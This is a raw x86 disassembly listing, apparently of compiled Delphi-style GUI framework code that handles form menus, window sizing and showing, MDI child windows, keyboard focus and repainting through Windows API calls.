push 0x0
push 0x1
push 0x80
mov eax edi
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
mov eax [ edi + 0x340 ]
call sub_3ac84c4
mov edx edi
call sub_3a7a33c
jmp r-xdata
mov edx ebx
mov eax [ edi + 0x32c ]
call sub_3a7a494
call sub_3ab7fd8
test al al
je r-xdata
mov edx ebx
mov eax [ edi + 0x32c ]
call sub_3a7a494
mov edx eax
mov eax ebp
call sub_3a7a33c
mov edx [ esp ]
mov eax edi
call sub_3ab6e2c
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x277 ] 0x1
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_3ad0a14
mov [ esp + 0x4 ] eax
mov eax [ edi + 0x1b4 ]
mov [ esp + 0x8 ] eax
cmp [ edi + 0x344 ] 0x0
setne al
mov [ esp + 0xc ] al
mov eax [ rw-data ]
mov eax [ eax + 0xc8 ]
push eax
lea eax [ esp + 0x8 ]
push eax
push 0xb048
push ebx
call SendMessageA
push 0x0
mov eax edi
call sub_3ab7c38
push eax
call SetMenu
xor edx edx
mov eax [ edi + 0x290 ]
call sub_3aa83bc
sub_3aca3a8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_3ab5d44
cmp [ ebx + 0x290 ] 0x0
je r-xdata
movzx edx [ esi + 0x4 ]
mov eax [ ebx + 0x290 ]
call sub_3aa7bb8
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_3aca3f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_3aa8688
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_3aca42c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_3aca4c7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x290 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aca4ce
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x290 ]
call sub_3aa7b18
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_3acffcc
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_3aac894
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3acffcc
jmp r-xdata
sub_3aca4d4
push ebx
push esi
mov esi edx
mov ebx eax
push 0xfffffff0
mov eax ebx
call sub_3ab7c38
push eax
call GetWindowLongA
and eax 0x40000000
cmp eax 0x40000000
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
setne dl
mov eax ebx
call sub_3ac9a00
sub_3aca518
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
test [ ebx + 0x55 ] 0x20
jne r-xdata
cmp [ ebx + 0x2ac ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov [ ebx + 0x273 ] dl
pop ebx
retn
mov eax [ ebx + 0x2ac ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_3aca574
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_3ac9a64
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_3aac66c
test eax eax
je r-xdata
cmp [ eax + 0x277 ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov edx [ eax + 0x290 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_3aca5cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_3ab6d0c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_3ace4bc
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x273 ] 0x1
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
sub_3aca654
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_3ab7c38
call sub_3ac4004
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_3ab7c38
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x274 ] 0x2
jmp r-xdata
cmp [ ebx + 0x274 ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x274 ] 0x1
mov [ ebx + 0x274 ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
movzx eax [ ebx + 0x274 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_3ab7c38
push eax
call ShowWindow
mov [ ebx + 0x274 ] 0x0
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ rw-data ] 0x0
pop esi
pop ebx
retn
sub_3aca6fc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x277 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3ab7c38
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_3ac9a00
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd0
call sub_3a6457c
sub_3aca754
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x268 ]
call sub_3ab8208
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_3aca780
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_3ac9a64
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_3aca79c
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_3aa7b48
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_3aa7b48
sub_3aca7dc
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x158 ] 0x1
jne r-xdata
cmp [ esi + 0x158 ] 0x0
jne r-xdata
cmp [ esi + 0x160 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x15c ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_3aca814
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x158 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x15c ]
call sub_3a652f4
mov [ edx ] 0x1
mov eax [ ebx + 0x160 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_3aca848
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_3aca9b2
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aca9b9
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0xd ] 0x1
push ebp
mov eax [ esi + 0x290 ]
call sub_3aca79c
pop ecx
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_3aac5e0
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x34 ]
xor edx edx
xor eax eax
call sub_3a78df4
lea edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x25 ]
mov eax esi
call sub_3aaf610
movzx eax [ ebp - 0x25 ]
mov [ ebp - 0x29 ] ax
movzx eax [ ebp - 0x21 ]
mov [ ebp - 0x27 ] ax
mov eax [ ebp - 0x29 ]
mov [ ebp - 0x11 ] eax
push ebp
mov eax [ esi + 0x80 ]
call sub_3aca79c
pop ecx
mov [ ebp - 0xc ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_3aca7dc
test al al
je r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3acfbf4
jmp r-xdata
mov ecx [ ebp - 0x11 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_3acfc7c
mov ecx [ ebp - 0xc ]
mov edx 0x8
mov eax [ rw-data ]
call sub_3acfc7c
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0xd ]
mov eax ebx
call sub_3aca814
lea ecx [ ebp - 0x34 ]
xor edx edx
xor eax eax
call sub_3a78df4
lea edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x19 ]
mov eax ebx
call sub_3aaf610
movzx eax [ ebp - 0x19 ]
mov [ ebp - 0x1d ] ax
movzx eax [ ebp - 0x15 ]
mov [ ebp - 0x1b ] ax
mov eax [ ebp - 0x1d ]
mov [ ebp - 0x11 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_3acfb64
test [ esi + 0x270 ] 0x8
je r-xdata
sub_3aca9c0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x272 ] 0x0
je r-xdata
mov edi [ esp ]
mov edi [ edi + 0x8 ]
mov eax [ esi + 0x74 ]
lea edx [ edi + 0x18 ]
mov ecx [ eax + 0x14 ]
test ecx ecx
jbe r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
jbe r-xdata
mov [ edx ] ecx
lea edx [ edi + 0x20 ]
mov ecx [ eax + 0xc ]
test ecx ecx
jbe r-xdata
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
test ecx ecx
jbe r-xdata
mov [ edx ] ecx
lea eax [ edi + 0x20 ]
push eax
lea eax [ edi + 0x24 ]
push eax
lea ecx [ edi + 0x1c ]
lea edx [ edi + 0x18 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ edx + 0x4 ] ecx
sub_3acaa34
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x34c ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_3acaa60
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x18 ]
and eax 0x8000
cmp eax 0x8000
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x348 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3acbb78
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab6038
mov eax [ ebp - 0x4 ]
call sub_3ad0d70
mov esi eax
mov eax esi
call sub_3ad105c
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
test [ edx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x10 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x48 ]
jne r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x10 ]
test edx edx
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4c ]
jne r-xdata
mov edi edx
mov edx [ ebp - 0x4 ]
sub edi [ edx + 0x48 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov ebx eax
test edi edi
jne r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ac7f40
lea edx [ ebp - 0x34 ]
call sub_3acc658
push ebp
lea eax [ esi + 0x8 ]
xor ecx ecx
mov edx [ ebp - 0x34 ]
call sub_3acaa34
pop ecx
push ebp
lea eax [ esi + 0xc ]
xor ecx ecx
mov edx [ ebp - 0x30 ]
call sub_3acaa34
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x2c ]
call sub_3acaa34
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x28 ]
call sub_3acaa34
pop ecx
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
sub eax [ esi + 0x18 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0xc ]
sub ecx [ esi + 0x14 ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
call sub_3a78e1c
mov eax [ ebp - 0x18 ]
cmp eax [ esi + 0x10 ]
jg r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jle r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
add [ ebp - 0x18 ] ebx
mov eax [ ebp - 0x20 ]
sub eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov [ eax + 0x8 ] 0x1
jmp r-xdata
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x1c ]
cmp edx eax
jle r-xdata
mov [ ebp - 0x18 ] eax
test edi edi
jle r-xdata
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
add [ ebp - 0x1c ] edi
sub eax edi
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov [ eax + 0x8 ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call InvalidateRect
mov [ ebp - 0x1c ] eax
sub_3acac4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab8b44
test [ ebx + 0x1c ] 0x10
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp [ ebx + 0x290 ] 0x0
je r-xdata
mov eax [ ebx + 0x290 ]
mov eax [ eax + 0x34 ]
call sub_3aa6694
test eax eax
jle r-xdata
mov ebx [ esi + 0x8 ]
push 0xf
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebx + 0x4 ] eax
sub_3acac98
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x358 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb0
call sub_3a6457c
pop esi
pop ebx
retn
sub_3acacbc
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x358 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffae
call sub_3a6457c
pop esi
pop ebx
retn
sub_3acace0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_3ab7084
movzx eax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x268 ]
mov eax ebx
call sub_3ab8208
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x268 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
movzx edx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_3ab8208
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_3acad7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3acb3dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_3ad00f8
mov eax [ ebp - 0x4 ]
or [ eax + 0x358 ] 0x4
xor edx edx
push ebp
push sub_3acb3c0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acb3c7
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_3acb292
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_3acae34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffab
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x4
je r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3ac9ab4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
jmp r-xdata
mov eax [ rw-data ]
call sub_3acc8d8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3aaf4fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x278 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_3acc8cc
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3aaf540
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
call sub_3ac4004
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_3acc8f0
cmp ebx eax
jge r-xdata
adc esi 0x0
adc esi 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ShowWindow
jmp r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
call sub_3ac432c
mov ebx eax
mov eax [ rw-data ]
call sub_3acc8e4
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_3acc8f0
mov ebx eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x273 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x273 ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_3acc908
mov ebx eax
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3aaf4fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_3acc8d8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_3acc8e4
mov esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x273 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_3aafe18
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call __imp_SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_3acc8f0
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3aaf540
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_3acc8cc
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax esi
call sub_3ac6950
mov ebx eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ac8740
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
jmp r-xdata
sub ebx eax
mov eax [ rw-data ]
call sub_3acc8fc
mov esi eax
sar esi 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_3acc8f0
cmp ebx eax
jge r-xdata
adc esi 0x0
jmp r-xdata
mov eax [ rw-data ]
call sub_3acc8f0
cmp ebx eax
jge r-xdata
adc esi 0x0
add ebx eax
mov eax esi
call sub_3ac6970
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x4c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_3acc8e4
add esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sar eax 0x1
jns r-xdata
adc esi 0x0
mov eax [ rw-data ]
call sub_3acc8e4
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_3acc8f0
mov ebx eax
mov eax [ rw-data ]
call sub_3acc8e4
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_3acc8f0
mov ebx eax
add eax edx
mov esi eax
jmp r-xdata
adc edx 0x0
sub esi eax
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
